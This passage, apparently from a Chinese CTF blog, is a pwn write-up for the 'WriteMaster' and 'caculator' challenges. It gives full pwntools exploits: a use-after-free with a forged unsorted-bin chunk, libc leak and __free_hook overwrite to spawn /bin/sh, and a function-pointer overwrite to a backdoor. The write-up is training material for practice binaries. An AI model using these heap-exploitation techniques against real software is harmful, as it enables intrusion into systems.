sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x410</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">    add(<span class="number">0x4f0</span>, <span class="string">&#x27;b&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>) <span class="comment"># 4</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">2</span>, <span class="number">0x20</span> * <span class="string">&#x27;a&#x27;</span> + p64(<span class="number">0x560</span>))</span><br><span class="line">    free(<span class="number">3</span>)</span><br><span class="line">    add(<span class="number">0x410</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    leak = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">1482</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    echo(<span class="string">&#x27;libc base:&#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    libc.address = leak</span><br><span class="line">    __free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">&#x27;3&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">&#x27;5&#x27;</span>) <span class="comment"># 5</span></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">3</span>, p64(__free_hook) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x108</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">    add(<span class="number">0x108</span>, p64(system)) <span class="comment"># 5</span></span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h3 id="WriteMaster"><a href="#WriteMaster" class="headerlink" title="WriteMaster"></a>WriteMaster</h3><h4 id="我想分享的一些分析技巧"><a href="#我想分享的一些分析技巧" class="headerlink" title="我想分享的一些分析技巧"></a>我想分享的一些分析技巧</h4><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzy318nhvj61br0u0q9m02.jpg" alt=""></p><p>在add函数中第一眼看过去很乱，猜测申请了很多结构体什么的，这个时候有经验的师傅硬看很好分析，但是对于我们来说要学会偷鸡，运行一下程序看看到底是干啥的</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzy5etqpsj610g0nmgn102.jpg" alt=""></p><p>看到先后输入了index（在红框框的上面，懒得重新截图了），header size，header，text size和text，然后找找add函数中的一堆exit信息中都输出了字符串，ida中看看</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzy8nhz28j61e60ngq9z02.jpg" alt=""></p><p>结合题目名字大概能够猜出来是一个文章管理的东西，能够写标题，写文章正文，反正业务就是这么个业务，逻辑就是这么个逻辑，实在不行gdb一顿动调也能发现各个chunk之间的衔接关系。</p><p>所以先随便写个结构体看看</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Article</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> header_size;</span><br><span class="line">  <span class="keyword">char</span>* header;</span><br><span class="line">  <span class="keyword">size_t</span> text_size;</span><br><span class="line">  <span class="keyword">char</span>* content;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzyn5t16rj60uh0u00yh02.jpg" alt=""></p><p>在ida中找到local types</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzyook15qj61cs0p877b02.jpg" alt=""></p><p>导入结构体，然后更改bss中的变量202040的类型为article</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzyq5cnj5j61om0n2gsj02.jpg" alt=""></p><p>看起来仍然不太对的样子，注意到有二级指针的存在，猜测文章头或者文章正文的地方还有一个结构体指针</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Header</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> header_size;</span><br><span class="line">  <span class="keyword">char</span>* content;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Text</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">size_t</span> text_size;</span><br><span class="line">  <span class="keyword">char</span>* content;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>分别导入后，挨边试下，最终可以优化成如下样子</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1guzz0q208oj61je0lkgrb02.jpg" alt=""></p><p>总之会比嗯审好点</p><h4 id="正片"><a href="#正片" class="headerlink" title="正片"></a>正片</h4><h5 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h5><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv18ihld8cj60si0hs76t02.jpg" alt=""></p><p>明显的UAF漏洞</p><p>只能申请小于0x60的chunk，输入666有个后门可以edit两次，如果不是限制了chunk的大小就是白给题</p><p>因为是uaf，拿到堆地址轻轻松松，通过uaf的布局伪造出ub，然后泄露出堆地址和libc的地址，最后劫持freehook来getshell，完整exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./WriterMaster&quot;</span></span><br><span class="line">libc_path_local = <span class="string">&quot;/glibc/x64/1.4_2.27/libc.so.6&quot;</span></span><br><span class="line">libc_path_remote = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-hp&#x27;</span>, <span class="string">&#x27;65&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="keyword">if</span> libc_path_local:</span><br><span class="line">        io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path_local&#125;)</span><br><span class="line">        libc = ELF(libc_path_local)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25965</span>)</span><br><span class="line">    <span class="keyword">if</span> libc_path_remote:</span><br><span class="line">        libc = ELF(libc_path_remote)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print ./WriteMaster&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">_add,_free,_show,_edit = <span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">666</span></span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;:&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, header, size, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_add))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;header size:&quot;</span>, <span class="built_in">str</span>(<span class="number">0x20</span>))</span><br><span class="line">    sa(<span class="string">&quot;header:&quot;</span>, header)</span><br><span class="line">    sla(<span class="string">&quot;text size:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_free))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_show))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    sla(menu, <span class="built_in">str</span>(_edit))</span><br><span class="line">    sla(<span class="string">&quot;index:&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;text:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))</span><br><span class="line">    add(<span class="number">1</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">2</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">3</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">4</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">5</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">    add(<span class="number">6</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        free(i)</span><br><span class="line">    </span><br><span class="line">    show(<span class="number">5</span>)</span><br><span class="line">    ru(<span class="string">&#x27;text:&#x27;</span>)</span><br><span class="line">    heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">    echo(<span class="string">&#x27;HEAP BASE:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">    edit(<span class="number">3</span>, p64(heap + <span class="number">0x2c0</span> + <span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x10</span>) + p64(heap) +  p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>))</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    leak = uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    echo(<span class="string">&#x27;LIBC BASE:&#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    libc.address = leak</span><br><span class="line">    __free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    add(<span class="number">12</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">13</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    free(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">12</span>, p64(__free_hook))</span><br><span class="line">    add(<span class="number">13</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x30</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    add(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x30</span>, p64(system))</span><br><span class="line">    free(<span class="number">13</span>)</span><br><span class="line">    <span class="comment"># gdba()</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h5 id="伪造ub详解"><a href="#伪造ub详解" class="headerlink" title="伪造ub详解"></a>伪造ub详解</h5><p>程序中还有个小漏洞，就是add的时候index可以由我们自己来指定，这样就造成了之前写过的在内存中的数据可能会被覆盖，所以极大增强了我们的体验，想怎么打都可以，考的点就是如何伪造出来一块ub，那么详细记录下</p><p>我是边做边给带🔥写的wp，首先写随便申请一通chunk，在chunk0中伪造一个假的header，日后可以覆盖chunk1的header</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    free(i)</span><br></pre></td></tr></table></figure><p><img src="/Users/lemon/Library/Application%20Support/typora-user-images/image-20211002165852836.png" alt=""></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">show(<span class="number">5</span>)</span><br><span class="line">ru(<span class="string">&#x27;text:&#x27;</span>)</span><br><span class="line">heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">echo(<span class="string">&#x27;HEAP BASE:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">edit(<span class="number">3</span>, p64(heap + <span class="number">0x2b0</span>))</span><br></pre></td></tr></table></figure><p>泄露出堆地址后，改个fd为之前伪造的header</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv12qeb61bj612a04s3z702.jpg" alt=""></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>))</span><br></pre></td></tr></table></figure><p>全部申请回来，最终会申请到fake chunk，然后顺势把下一个chunk的header给🐑了</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv152umtcrj61b40awwgo02.jpg" alt=""></p><p>就像这个样，这样就有unsorted bin（下文记为ub）可以用了，但是free的时候还要伪造ub的下一个chunk的header要不然过不了check，手算一波偏移，大概在最底部的chunk附近，所以把之前的exp稍微改改，6号chunk的内容全改为合法的header，目前为止exp长这样：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">ru(<span class="string">&#x27;text:&#x27;</span>)</span><br><span class="line">heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">echo(<span class="string">&#x27;HEAP BASE:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">edit(<span class="number">3</span>, p64(heap + <span class="number">0x2c0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>))</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv158sjq5uj61he0e6tbj02.jpg" alt=""></p><p>fake ub 伪造完成，下面就是leak出来libc的地址</p><p>尴尬，伪造好突然发现ub在文章的header部分，程序没有header部分的free功能，只能重新伪造了，思路是一样的</p><p><img src="/Users/lemon/Library/Application%20Support/typora-user-images/image-20211002192548895.png" alt=""></p><p>经过一点修改后将其伪造到了idx为1的位置，思路是一样的，现给出前面部分的exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))<span class="comment"># 无脑伪造</span></span><br><span class="line">add(<span class="number">1</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0x60</span>, (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) * (<span class="number">0x60</span> / <span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">ru(<span class="string">&#x27;text:&#x27;</span>)</span><br><span class="line">heap = uu64(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)[-<span class="number">6</span>:]) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">echo(<span class="string">&#x27;HEAP BASE:&#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line">edit(<span class="number">3</span>, p64(heap + <span class="number">0x2c0</span> + <span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>, <span class="number">0x60</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x10</span>) + p64(heap) +  p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>)) <span class="comment"># 伪造ub，中间有个部分填写heap的原因是show的时候需要寻址，需要填写一个合法地址</span></span><br></pre></td></tr></table></figure><p>伪造出ub后面的就是白给flag了</p><h3 id="caculator"><a href="#caculator" class="headerlink" title="caculator"></a>caculator</h3><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>简简单单的VM pwn，估计是全网最简单的VM pwn了，提供了直接和程序模拟的寄存器的交互接口，漏洞位于一个任意地址写，bss上还有函数指针，main还调用了这个指针，程序还有后门，改指针为后门函数一把🔐</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./caculator&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x40</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x400ba0</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x48</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x48</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x38</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(-<span class="number">8</span>))</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x50</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>甚至可以不用pwntools直接nc上去getshell</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1d2sklx1j30fu0akq30.jpg" alt=""></p><h4 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h4><p>静态编译，知道有人想🔨我了</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1b77v9kfj61020nygnj02.jpg" alt=""></p><p>热知识，main在rdi寄存器里</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1cuohlsrj60vk0bognn02.jpg" alt=""></p><p>四行代码，简简单单</p><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gv1b9h2zqnj30xw0u0gqf.jpg" alt=""></p><p>第二个函数才是主要逻辑，一堆case，VM pwn没跑了</p><p>无论是经验，还是现搜，先确定一些系统函数：<a 